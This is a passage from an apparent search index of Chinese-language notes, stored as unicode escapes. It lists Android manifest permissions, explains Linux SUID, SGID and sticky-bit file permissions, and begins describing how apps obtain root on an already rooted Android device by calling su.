//\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u521d\u59cb\u5316\u4e00\u4e2a\u7535\u8bdd\u62e8\u53f7\u4e0d\u9700\u901a\u8fc7\u62e8\u53f7\u7528\u6237\u754c\u9762\u9700\u8981\u7528\u6237\u786e\u8ba4 android.permission.CALL_PRIVILEGED //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u62e8\u6253\u4efb\u4f55\u53f7\u7801\uff0c\u5305\u542b\u7d27\u6025\u53f7\u7801\u65e0\u9700\u901a\u8fc7\u62e8\u53f7\u7528\u6237\u754c\u9762\u9700\u8981\u7528\u6237\u786e\u8ba4 android.permission.CAMERA //\u8bf7\u6c42\u8bbf\u95ee\u4f7f\u7528\u7167\u76f8\u8bbe\u5907 android.permission.CHANGE_COMPONENT_ENABLED_STATE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u662f\u5426\u6539\u53d8\u4e00\u4e2a\u7ec4\u4ef6\u6216\u5176\u4ed6\u7684\u542f\u7528\u6216\u7981\u7528 android.permission.CHANGE_CONFIGURATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u4fee\u6539\u5f53\u524d\u8bbe\u7f6e\uff0c\u5982\u672c\u5730\u5316 android.permission.CHANGE_NETWORK_STATE //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8\u7f51\u7edc\u8fde\u63a5\u72b6\u6001 android.permission.CHANGE_WIFI_STATE //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8Wi-Fi\u8fde\u63a5\u72b6\u6001 android.permission.CLEAR_APP_CACHE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6e05\u695a\u7f13\u5b58\u4ece\u6240\u6709\u5b89\u88c5\u7684\u7a0b\u5e8f\u5728\u8bbe\u5907\u4e2d android.permission.CLEAR_APP_USER_DATA //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6e05\u9664\u7528\u6237\u8bbe\u7f6e android.permission.CONTROL_LOCATION_UPDATES //\u5141\u8bb8\u542f\u7528\u7981\u6b62\u4f4d\u7f6e\u66f4\u65b0\u63d0\u793a\u4ece\u65e0\u7ebf\u6a21\u5757 android.permission.DELETE_CACHE_FILES //\u5141\u8bb8\u7a0b\u5e8f\u5220\u9664\u7f13\u5b58\u6587\u4ef6 android.permission.DELETE_PACKAGES //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5220\u9664\u5305 android.permission.DEVICE_POWER //\u5141\u8bb8\u8bbf\u95ee\u5e95\u5c42\u7535\u6e90\u7ba1\u7406 android.permission.DIAGNOSTIC //\u5141\u8bb8\u7a0b\u5e8fRW\u8bca\u65ad\u8d44\u6e90 android.permission.DISABLE_KEYGUARD //\u5141\u8bb8\u7a0b\u5e8f\u7981\u7528\u952e\u76d8\u9501 android.permission.DUMP //\u5141\u8bb8\u7a0b\u5e8f\u8fd4\u56de\u72b6\u6001\u6293\u53d6\u4fe1\u606f\u4ece\u7cfb\u7edf\u670d\u52a1 android.permission.EXPAND_STATUS_BAR //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6269\u5c55\u6536\u7f29\u5728\u72b6\u6001\u680f,android\u5f00\u53d1\u7f51\u63d0\u793a\u5e94\u8be5\u662f\u4e00\u4e2a\u7c7b\u4f3cWindows Mobile\u4e2d\u7684\u6258\u76d8\u7a0b\u5e8f android.permission.FACTORY_TEST //\u4f5c\u4e3a\u4e00\u4e2a\u5de5\u5382\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u8fd0\u884c\u5728root\u7528\u6237 android.permission.FLASHLIGHT //\u8bbf\u95ee\u95ea\u5149\u706f,android\u5f00\u53d1\u7f51\u63d0\u793aHTC Dream\u4e0d\u5305\u542b\u95ea\u5149\u706f android.permission.FORCE_BACK //\u5141\u8bb8\u7a0b\u5e8f\u5f3a\u884c\u4e00\u4e2a\u540e\u9000\u64cd\u4f5c\u662f\u5426\u5728\u9876\u5c42activities android.permission.FOTA_UPDATE //\u6682\u65f6\u4e0d\u4e86\u89e3\u8fd9\u662f\u505a\u4ec0\u4e48\u4f7f\u7528\u7684\uff0candroid\u5f00\u53d1\u7f51\u5206\u6790\u53ef\u80fd\u662f\u4e00\u4e2a\u9884\u7559\u6743\u9650. android.permission.GET_ACCOUNTS //\u8bbf\u95ee\u4e00\u4e2a\u5e10\u6237\u5217\u8868\u5728Accounts Service\u4e2d android.permission.GET_PACKAGE_SIZE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u83b7\u53d6\u4efb\u4f55package\u5360\u7528\u7a7a\u95f4\u5bb9\u91cf android.permission.GET_TASKS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u83b7\u53d6\u4fe1\u606f\u6709\u5173\u5f53\u524d\u6216\u6700\u8fd1\u8fd0\u884c\u7684\u4efb\u52a1\uff0c\u4e00\u4e2a\u7f29\u7565\u7684\u4efb\u52a1\u72b6\u6001\uff0c\u662f\u5426\u6d3b\u52a8\u7b49\u7b49 android.permission.HARDWARE_TEST //\u5141\u8bb8\u8bbf\u95ee\u786c\u4ef6 android.permission.INJECT_EVENTS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u622a\u83b7\u7528\u6237\u4e8b\u4ef6\u5982\u6309\u952e\u3001\u89e6\u6478\u3001\u8f68\u8ff9\u7403\u7b49\u7b49\u5230\u4e00\u4e2a\u65f6\u95f4\u6d41\uff0candroid\u5f00\u53d1\u7f51\u63d0\u9192\u7b97\u662fhook\u6280\u672f\u5427 android.permission.INSTALL_PACKAGES //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5b89\u88c5packages android.permission.INTERNAL_SYSTEM_WINDOW //\u5141\u8bb8\u6253\u5f00\u7a97\u53e3\u4f7f\u7528\u7cfb\u7edf\u7528\u6237\u754c\u9762 android.permission.INTERNET //\u5141\u8bb8\u7a0b\u5e8f\u6253\u5f00\u7f51\u7edc\u5957\u63a5\u5b57 android.permission.MANAGE_APP_TOKENS //\u5141\u8bb8\u7a0b\u5e8f\u7ba1\u7406(\u521b\u5efa\u3001\u50ac\u540e\u3001 z- order\u9ed8\u8ba4\u5411z\u8f74\u63a8\u79fb)\u7a0b\u5e8f\u5f15\u7528\u5728\u7a97\u53e3\u7ba1\u7406\u5668\u4e2d android.permission.MASTER_CLEAR //\u76ee\u524d\u8fd8\u6ca1\u6709\u660e\u786e\u7684\u89e3\u91ca\uff0candroid\u5f00\u53d1\u7f51\u5206\u6790\u53ef\u80fd\u662f\u6e05\u9664\u4e00\u5207\u6570\u636e\uff0c\u7c7b\u4f3c\u786c\u683c\u673a android.permission.MODIFY_AUDIO_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u4fee\u6539\u5168\u5c40\u97f3\u9891\u8bbe\u7f6e android.permission.MODIFY_PHONE_STATE //\u5141\u8bb8\u4fee\u6539\u8bdd\u673a\u72b6\u6001\uff0c\u5982\u7535\u6e90\uff0c\u4eba\u673a\u63a5\u53e3\u7b49 android.permission.MOUNT_UNMOUNT_FILESYSTEMS //\u5141\u8bb8\u6302\u8f7d\u548c\u53cd\u6302\u8f7d\u6587\u4ef6\u7cfb\u7edf\u53ef\u79fb\u52a8\u5b58\u50a8 android.permission.PERSISTENT_ACTIVITY //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbe\u7f6e\u4ed6\u7684activities\u663e\u793a android.permission.PROCESS_OUTGOING_CALLS //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u89c6\u3001\u4fee\u6539\u6709\u5173\u64ad\u51fa\u7535\u8bdd android.permission.READ_CALENDAR //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u7528\u6237\u65e5\u5386\u6570\u636e android.permission.READ_CONTACTS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u7528\u6237\u8054\u7cfb\u4eba\u6570\u636e android.permission.READ_FRAME_BUFFER //\u5141\u8bb8\u7a0b\u5e8f\u5c4f\u5e55\u6ce2\u6216\u548c\u66f4\u591a\u5e38\u89c4\u7684\u8bbf\u95ee\u5e27\u7f13\u51b2\u6570\u636e android.permission.READ_INPUT_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8fd4\u56de\u5f53\u524d\u6309\u952e\u72b6\u6001 android.permission.READ_LOGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u5e95\u5c42\u7cfb\u7edf\u65e5\u5fd7\u6587\u4ef6 android.permission.READ_OWNER_DATA //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u6240\u6709\u8005\u6570\u636e android.permission.READ_SMS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u77ed\u4fe1\u606f android.permission.READ_SYNC_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u540c\u6b65\u8bbe\u7f6e android.permission.READ_SYNC_STATS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u540c\u6b65\u72b6\u6001 android.permission.REBOOT //\u8bf7\u6c42\u80fd\u591f\u91cd\u65b0\u542f\u52a8\u8bbe\u5907 android.permission.RECEIVE_BOOT_COMPLETED //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u63a5\u6536\u5230 android.permission.RECEIVE_MMS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u76d1\u63a7\u5c06\u6536\u5230MMS\u5f69\u4fe1,\u8bb0\u5f55\u6216\u5904\u7406 android.permission.RECEIVE_SMS //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u4e00\u4e2a\u5c06\u6536\u5230\u77ed\u4fe1\u606f\uff0c\u8bb0\u5f55\u6216\u5904\u7406 android.permission.RECEIVE_WAP_PUSH //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u5c06\u6536\u5230WAP PUSH\u4fe1\u606f android.permission.RECORD_AUDIO //\u5141\u8bb8\u7a0b\u5e8f\u5f55\u5236\u97f3\u9891 android.permission.REORDER_TASKS //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8Z\u8f74\u6392\u5217\u4efb\u52a1 android.permission.RESTART_PACKAGES //\u5141\u8bb8\u7a0b\u5e8f\u91cd\u65b0\u542f\u52a8\u5176\u4ed6\u7a0b\u5e8f android.permission.SEND_SMS //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u9001SMS\u77ed\u4fe1 android.permission.SET_ACTIVITY_WATCHER //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u6216\u63a7\u5236activities\u5df2\u7ecf\u542f\u52a8\u5168\u5c40\u7cfb\u7edf\u4e2d android.permission.SET_ALWAYS_FINISH //\u5141\u8bb8\u7a0b\u5e8f\u63a7\u5236\u662f\u5426\u6d3b\u52a8\u95f4\u63a5\u5b8c\u6210\u5728\u5904\u4e8e\u540e\u53f0\u65f6 android.permission.SET_ANIMATION_SCALE //\u4fee\u6539\u5168\u5c40\u4fe1\u606f\u6bd4\u4f8b android.permission.SET_DEBUG_APP //\u914d\u7f6e\u4e00\u4e2a\u7a0b\u5e8f\u7528\u4e8e\u8c03\u8bd5 android.permission.SET_ORIENTATION //\u5141\u8bb8\u5e95\u5c42\u8bbf\u95ee\u8bbe\u7f6e\u5c4f\u5e55\u65b9\u5411\u548c\u5b9e\u9645\u65cb\u8f6c android.permission.SET_PREFERRED_APPLICATIONS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u4fee\u6539\u5217\u8868\u53c2\u6570PackageManager.addPackageToPreferred()\u548cPackageManager.removePackageFromPreferred()\u65b9\u6cd5 android.permission.SET_PROCESS_FOREGROUND //\u5141\u8bb8\u7a0b\u5e8f\u5f53\u524d\u8fd0\u884c\u7a0b\u5e8f\u5f3a\u884c\u5230\u524d\u53f0 android.permission.SET_PROCESS_LIMIT //\u5141\u8bb8\u8bbe\u7f6e\u6700\u5927\u7684\u8fd0\u884c\u8fdb\u7a0b\u6570\u91cf android.permission.SET_TIME_ZONE //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u65f6\u95f4\u533a\u57df android.permission.SET_WALLPAPER //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u58c1\u7eb8 android.permission.SET_WALLPAPER_HINTS //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u58c1\u7eb8hits android.permission.SIGNAL_PERSISTENT_PROCESSES //\u5141\u8bb8\u7a0b\u5e8f\u8bf7\u6c42\u53d1\u9001\u4fe1\u53f7\u5230\u6240\u6709\u663e\u793a\u7684\u8fdb\u7a0b\u4e2d android.permission.STATUS_BAR //\u5141\u8bb8\u7a0b\u5e8f\u6253\u5f00\u3001\u5173\u95ed\u6216\u7981\u7528\u72b6\u6001\u680f\u53ca\u56fe\u6807Allows an application to open, close, or disable the status bar and its icons. android.permission.SUBSCRIBED_FEEDS_READ //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95ee\u8ba2\u9605RSS Feed\u5185\u5bb9\u63d0\u4f9b android.permission.SUBSCRIBED_FEEDS_WRITE //\u7cfb\u7edf\u6682\u65f6\u4fdd\u7559\u6539\u8bbe\u7f6e,android\u5f00\u53d1\u7f51\u8ba4\u4e3a\u672a\u6765\u7248\u672c\u4f1a\u52a0\u5165\u8be5\u529f\u80fd\u3002 android.permission.SYSTEM_ALERT_WINDOW //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6253\u5f00\u7a97\u53e3\u4f7f\u7528 TYPE_SYSTEM_ALERT\uff0c\u663e\u793a\u5728\u5176\u4ed6\u6240\u6709\u7a0b\u5e8f\u7684\u9876\u5c42(Allows an application to open windows using the type TYPE_SYSTEM_ALERT, shown on top of all other applications. ) android.permission.VIBRATE //\u5141\u8bb8\u8bbf\u95ee\u632f\u52a8\u8bbe\u5907 android.permission.WAKE_LOCK //\u5141\u8bb8\u4f7f\u7528PowerManager\u7684 WakeLocks\u4fdd\u6301\u8fdb\u7a0b\u5728\u4f11\u7720\u65f6\u4ece\u5c4f\u5e55\u6d88\u5931 android.permission.WRITE_APN_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165APN\u8bbe\u7f6e android.permission.WRITE_CALENDAR //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u7528\u6237\u65e5\u5386\u6570\u636e android.permission.WRITE_CONTACTS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u7528\u6237\u8054\u7cfb\u4eba\u6570\u636e android.permission.WRITE_GSERVICES //\u5141\u8bb8\u7a0b\u5e8f\u4fee\u6539Google\u670d\u52a1\u5730\u56fe android.permission.WRITE_OWNER_DATA //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u6240\u6709\u8005\u6570\u636e android.permission.WRITE_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u6216\u5199\u5165\u7cfb\u7edf\u8bbe\u7f6e android.permission.WRITE_SMS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u77ed\u4fe1 android.permission.WRITE_SYNC_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165\u540c\u6b65\u8bbe\u7f6e","title":"APK\u5728AndroidManifest.xml\u5e38\u7528\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#linux","text":"\u53d1\u5e03\u4e8e: \u4e00\u822c\u6587\u4ef6\u6743\u9650\u8bfb\uff08R\uff09\uff0c\u5199(W)\uff0c\u6267\u884c\uff08X\uff09\u6743\u9650\u6bd4\u8f83\u7b80\u5355\u3002\u4e00\u822c\u6750\u6599\u4e0a\u9762\u90fd\u6709\u4ecb\u7ecd\u3002 \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e0b\u4e00\u4e9b\u7279\u6b8a\u7684\u6587\u4ef6\u6743\u9650\u2014\u2014SUID\uff0cSGID\uff0cStick bit\u3002\u5982\u679c\u4f60\u68c0\u67e5\u4e00\u4e0b/usr/bin/passwd\u548c/tmp/\u7684\u6587\u4ef6\u6743\u9650\u4f60\u5c31\u4f1a\u53d1\u73b0\u548c\u666e\u901a\u7684\u6587\u4ef6\u6743\u9650\u6709\u5c11\u8bb8\u4e0d\u540c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u8fd9\u91cc\u5c31\u6d89\u53ca\u5230SUID\u548cStick bit\u3002 SUID\u548cSGID \u6211\u4eec\u9996\u5148\u6765\u8c08\u4e00\u4e0bpasswd\u7a0b\u5e8f\u7279\u6b8a\u7684\u5730\u65b9\u3002\u5927\u5bb6\u90fd\u77e5\u9053\uff0cLinux\u628a\u7528\u6237\u7684\u5bc6\u7801\u4fe1\u606f\u5b58\u653e\u5728/etc/shadow\u91cc\u9762\uff0c\u8be5\u6587\u4ef6\u5c5e\u6027\u5982\u4e0b\uff1a \u53ef\u4ee5\u770b\u5230Shadow\u7684\u53ea\u6709\u6240\u6709\u8005\u53ef\u8bfb\u5199\uff0c\u6240\u6709\u8005\u662froot\uff0c\u6240\u4ee5\u8be5\u6587\u4ef6\u5bf9\u666e\u901a\u7528\u6237\u662f\u4e0d\u53ef\u8bfb\u5199\u7684\u3002\u4f46\u662f\u666e\u901a\u7528\u6237\u8c03\u7528passwd\u7a0b\u5e8f\u662f\u53ef\u4ee5\u4fee\u6539\u81ea\u5df1\u7684\u5bc6\u7801\u7684\uff0c\u8fd9\u53c8\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f\u96be\u9053\u666e\u901a\u7528\u6237\u53ef\u4ee5\u8bfb\u5199shadow\u6587\u4ef6\uff1f\u5f53\u7136\u4e0d\u662f\u5566\u3002password\u53ef\u4ee5\u4fee\u6539shadow\u6587\u4ef6\u7684\u539f\u56e0\u662f\u4ed6\u8bbe\u7f6e\u4e86SUID\u6587\u4ef6\u6743\u9650\u3002 SUID\u6587\u4ef6\u6743\u9650\u4f5c\u7528\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u3002\u4e00\u822c\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5728\u6267\u884c\u671f\u7684\u6240\u6709\u8005\u662f\u5f53\u524d\u7528\u6237\uff0c\u6bd4\u5982\u5f53\u524d\u7cfb\u7edf\u7528\u6237\u662fsimon\uff0csimon\u8fd0\u884c\u7a0b\u5e8fa.out\uff0ca.out\u6267\u884c\u671f\u7684\u6240\u6709\u8005\u5e94\u8be5\u662fsimon\u3002 \u4f46\u662f\u5982\u679c\u6211\u4eec\u7ed9\u53ef\u6267\u884c\u6587\u4ef6\u8bbe\u7f6e\u4e86SUID\u6743\u9650\uff0c\u5219\u8be5\u7a0b\u5e8f\u6267\u884c\u671f\u95f4\u7684\u6240\u6709\u8005\uff0c\u5c31\u662f\u8be5\u6587\u4ef6\u6240\u6709\u8005 \u3002\u8fd8\u4ee5\u524d\u9762\u7684a.out\u4e3a\u4f8b\uff0c\u5047\u5982a.out\u8bbe\u7f6e\u4e86SUID\uff0c\u5e76\u4e14\u5176\u6240\u6709\u8005\u662froot\uff0c\u7cfb\u7edf\u5f53\u524d\u7528\u6237\u662fsimon\uff0c\u5f53simon\u8fd0\u884ca.out\u7684\u65f6\u5019\uff0ca.out\u5728\u8fd0\u884c\u671f\u7684\u6240\u6709\u8005\u5c31\u662froot\uff0c\u8fd9\u65f6a.out\u53ef\u4ee5\u5b58\u53d6\u53ea\u6709root\u6743\u9650\u624d\u80fd\u5b58\u53d6\u7684\u8d44\u6e90\uff0c\u6bd4\u5982\u8bfb\u5199shadow\u6587\u4ef6\u3002\u5f53a.out\u6267\u884c\u7ed3\u675f\u7684\u65f6\u5019\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u53c8\u56de\u5230\u4e86simon\u7684\u6743\u9650\u4e86\u3002 passwd\u5c31\u662f\u8bbe\u7f6e\u4e86SUID\u6743\u9650\uff0c\u5e76\u4e14passwd\u7684\u6240\u6709\u8005\u662froot\uff0c\u6240\u4ee5\u6240\u6709\u7684\u7528\u6237\u90fd\u53ef\u4ee5\u6267\u884c\u4ed6\uff0c\u5728passwd\u8fd0\u884c\u671f\uff0c\u7a0b\u5e8f\u83b7\u5f97\u4e34\u65f6\u7684root\u6743\u9650\uff0c\u8fd9\u65f6\u5176\u53ef\u4ee5\u5b58\u53d6shadow\u6587\u4ef6\u3002\u5f53passwd\u8fd0\u884c\u5b8c\u6210\uff0c\u5f53\u524d\u7528\u6237\u53c8\u56de\u5230\u666e\u901a\u6743\u9650\u3002 \u540c\u7406\uff0c\u8bbe\u7f6e\u7a0b\u5e8f\u7684SGID\uff0c\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u8fd0\u884c\u671f\u53ef\u4ee5\u4e34\u65f6\u83b7\u5f97\u6240\u6709\u8005\u7ec4\u7684\u6743\u9650\u3002\u5728\u56e2\u961f\u5f00\u53d1\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u6587\u4ef6\u6743\u9650\u6bd4\u8f83\u6709\u7528\uff0c\u4e00\u822c\u7cfb\u7edf\u7528SUID\u6bd4\u8f83\u591a\u3002 SGID\u53ef\u4ee5\u7528\u4e8e\u76ee\u5f55\uff0c\u5f53\u76ee\u5f55\u8bbe\u7f6e\u4e86SGID\u4e4b\u540e\uff0c\u5728\u8be5\u76ee\u5f55\u4e0b\u9762\u5efa\u7acb\u7684\u6240\u6709\u6587\u4ef6\u548c\u76ee\u5f55\u90fd\u5177\u6709\u548c\u8be5\u76ee\u5f55\u76f8\u540c\u7684\u7528\u6237\u7ec4\u3002 Stick bit(\u7c98\u8d34\u4f4d) \u5bf9\u7a0b\u5e8f\uff0c\u8be5\u6743\u9650\u544a\u8bc9\u7cfb\u7edf\u5728\u7a0b\u5e8f\u5b8c\u6210\u540e\u5728\u5185\u5b58\u4e2d\u4fdd\u5b58\u4e00\u4efd\u8fd0\u884c\u7a0b\u5e8f\u7684\u5907\u4efd\uff0c\u5982\u8be5\u7a0b\u5e8f\u5e38\u7528\uff0c\u53ef\u4e3a\u7cfb\u7edf\u8282\u7701\u70b9\u65f6\u95f4\uff0c\u4e0d\u7528\u6bcf\u6b21\u4ece\u78c1\u76d8\u52a0\u8f7d\u5230\u5185\u5b58\u3002Linux\u5f53\u524d\u5bf9\u6587\u4ef6\u6ca1\u6709\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u4e00\u4e9b\u5176\u4ed6\u7684UNIX\u7cfb\u7edf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u529f\u80fd\u3002 Stick bit\u53ef\u4ee5\u4f5c\u7528\u4e8e\u76ee\u5f55\uff0c\u5728\u8bbe\u7f6e\u4e86\u7c98\u8d34\u4f4d\u7684\u76ee\u5f55\u4e0b\u9762\u7684\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u53ea\u6709\u6240\u6709\u8005\u548croot\u53ef\u4ee5\u5220\u9664\u4ed6\u3002\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u56de\u5934\u53bb\u770b\u770b/tmp/\u76ee\u5f55\u7684\u60c5\u51b5\uff0c\u8fd9\u4e2a\u76ee\u5f55\u8bbe\u7f6e\u4e86\u7c98\u8d34\u4f4d\u3002\u6240\u4ee5\u8bf4\uff0c\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u5bf9\u8be5\u76ee\u5f55\u8bfb\u5199\u6267\u884c\uff08777\uff09\uff0c\u8fd9\u6837\u610f\u5473\u7740\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u5728/tmp/\u4e0b\u9762\u521b\u5efa\u4e34\u65f6\u76ee\u5f55\u3002\u56e0\u4e3a\u8bbe\u7f6eStick bit\u53ea\u6709\u6240\u6709\u8005\u548croot\u624d\u80fd\u5220\u9664\u76ee\u5f55\u3002\u8fd9\u6837\u666e\u901a\u7528\u6237\u53ea\u80fd\u5220\u9664\u5c5e\u4e8e\u81ea\u5df1\u7684\u6587\u4ef6\uff0c\u800c\u4e0d\u80fd\u5220\u9664\u5176\u4ed6\u4eba\u7684\u6587\u4ef6\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u8bbe\u7f6eSUID\uff0cSGID\uff0cStick bit \u524d\u9762\u4ecb\u7ecd\u8fc7SUID\u4e0eSGID\u7684\u529f\u80fd\uff0c\u90a3\u4e48\uff0c\u5982\u4f55\u6253\u5f00\u6587\u4ef6\u4f7f\u5176\u6210\u4e3a\u5177\u6709SUID\u4e0eSGID\u7684\u6743\u9650\u5462\uff1f\u8fd9\u5c31\u9700\u8981\u4f7f\u7528\u6570\u5b57\u66f4\u6539\u6743\u9650\u4e86\u3002\u73b0\u5728\u5e94\u8be5\u77e5\u9053\uff0c\u4f7f\u7528\u6570\u5b57\u66f4\u6539\u6743\u9650\u7684\u65b9\u5f0f\u4e3a\u201c3\u4e2a\u6570\u5b57\u201d\u7684\u7ec4\u5408\uff0c\u90a3\u4e48\uff0c\u5982\u679c\u5728\u8fd93\u4e2a\u6570\u5b57\u4e4b\u524d\u518d\u52a0\u4e0a\u4e00\u4e2a\u6570\u5b57\uff0c\u6700\u524d\u9762\u7684\u6570\u5b57\u5c31\u8868\u793a\u8fd9\u51e0\u4e2a\u5c5e\u6027\u4e86\uff08\u6ce8\uff1a\u901a\u5e38\u6211\u4eec\u4f7f\u7528chmod 0777 filename\u7684\u65b9\u5f0f\u6765\u8bbe\u7f6efilename\u7684\u5c5e\u6027\u65f6\uff0c\u5219\u662f\u5047\u8bbe\u6ca1\u6709SUID\u3001SGID\u53caSticky bit\uff09\u3002 4\u4e3aSUID 2\u4e3aSGID 1\u4e3aSticky bit \u5047\u8bbe\u8981\u5c06\u4e00\u4e2a\u6587\u4ef6\u5c5e\u6027\u6539\u4e3a\u201c-rwsr-xr-x\u201d\uff0c\u7531\u4e8es\u5728\u7528\u6237\u6743\u9650\u4e2d\uff0c\u6240\u4ee5\u662fSUID\uff0c\u56e0\u6b64\uff0c\u5728\u539f\u5148\u7684755\u4e4b\u524d\u8fd8\u8981\u52a0\u4e0a4\uff0c\u4e5f\u5c31\u662f\u4f7f\u7528\u201cchmod 4755 filename\u201d\u6765\u8bbe\u7f6e\u3002 SUID\u4e5f\u53ef\u4ee5\u7528\u201cchmod u+s filename\u201d\u6765\u8bbe\u7f6e\uff0c\u201cchmod u-s filename\u201d\u6765\u53d6\u6d88SUID\u8bbe\u7f6e\uff1b\u540c\u6837\uff0cSGID\u53ef\u4ee5\u7528\u201cchmod g+s filename\u201d\uff0c\u201cchmod g-s filename\u201d\u6765\u53d6\u6d88SGID\u8bbe\u7f6e\u3002","title":"Linux\u7684\u7279\u6b8a\u6587\u4ef6\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#androidroot_1","text":"\u83b7\u5f97root\u6743\u9650\u7684\u4ee3\u7801\u5982\u4e0b\uff1a Process process = Runtime.getRuntime().exec(\"su\"); DataOutputStream os =new DataOutputStream(process.getOutputStream()); ...... os.writeBytes(\"exit\\n\"); os.flush(); process.waitFor(); \u4ece\u4e0a\u9762\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u9996\u5148\u8981\u8fd0\u884csu\u7a0b\u5e8f\uff0c\u5176\u5b9eroot\u7684\u79d8\u5bc6\u90fd\u5728su\u7a0b\u5e8f\u4e2d\uff0cAndroid\u7cfb\u7edf\u9ed8\u8ba4\u7684su\u7a0b\u5e8f\u53ea\u80fdroot\u548cshell\u53ef\u4ee5\u7528\u8fd0\u884csu\uff0c\u5982\u679c\u628a\u8fd9\u4e2a\u9650\u5236\u62ff\u6389\uff0c\u5c31\u662froot\u7834\u89e3\u4e86\uff01 \u4e0b\u9762\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\u662f\u600e\u6837\u83b7\u5f97root\u6743\u9650\u7684\uff0c\u5982\u679c\u5bf9Linux\u7684su\u547d\u4ee4\u719f\u6089\u7684\u670b\u53cb\u53ef\u80fd\u77e5\u9053su\u7a0b\u5e8f\u90fd\u8bbe\u7f6eSUID\u4f4d\uff0c\u6211\u4eec\u67e5\u770b\u4e00\u4e0b\u5df2\u7ecfroot\u7834\u89e3\u4e0a\u7684su\u6743\u9650\u8bbe\u7f6e\uff0c \u6211\u4eec\u53d1\u73b0su\u7684\u6240\u6709\u8005\u548c\u6240\u6709\u7ec4\u90fd\u662froot\uff0c\u662f\u5176\u5b9e\u662fbusybox\u7684\u8f6f\u94fe\u63a5\uff0c\u6211\u4eec\u67e5\u770bbusybox\u7684\u5c5e\u6027\u53d1\u73b0\uff0c\u5176\u8bbe\u7f6e\u4e86SUID\u548cSGID\uff0c\u5e76\u4e14\u6240\u6709\u8005\u548c\u6240\u6709\u7ec4\u90fd\u662froot\u3002\u8fd9\u6837\u8fd0\u884cbusybox\u7684\u666e\u901a\u7528\u6237\uff0cbusybox\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u83b7\u5f97\u7684\u662froot\u7684\u6709\u6548\u7528\u6237\u3002su\u7a0b\u5e8f\u5219\u662f\u628a\u81ea\u5df1\u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u5e76\u628a\u81ea\u5df1\u6743\u9650\u63d0\u5347\u81f3root\uff08\u6211\u4eec\u524d\u9762\u63d0\u5230su\u5176\u5b9e\u5c31